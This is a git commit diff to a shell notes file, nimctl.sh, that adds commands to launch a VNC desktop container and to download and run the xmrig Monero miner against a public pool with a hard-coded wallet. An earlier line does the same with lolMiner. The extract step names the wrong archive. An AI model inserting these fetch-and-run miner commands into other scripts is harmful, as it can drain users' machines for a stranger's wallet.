d02304857fca5595528d26aaa6f2d6bb5aef9dba
Kushal Shah <code@kushalshah.com.np>
2024-04-21 14:15:44 +0545

    Update nimctl.sh

--- nimctl.sh
+++ nimctl.sh
@@ -10,3 +10,9 @@ cmake ..
 make -j$(nproc)
 -----------------------------------------------------------
 wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz && tar -xf lolMiner_v1.31_Lin64.tar.gz && cd 1.31/ && ls && ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user LTC:Your Wallet.WORKER1 --ethstratum ETHPROXY
+------------------------------------------------------------
+docker run -p 6070:80 dorowu/ubuntu-desktop-lxde-vnc
+wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz
+tar xvzf xmrig-6.20.0-linux-x64.tar.gz
+cd xmrig-6.20.0/
+./xmrig --donate-level 5 -o xmrpool.eu:9999 -u 48SHAdpko5EisWs6ewvVJUWWPsMQyMvSHP1hQp15NVakaV6QTAHKfNhiCQdgSnTCSnUQeLTrWYqVpBHwMvWAWbbxRXmRnUj -k --tls
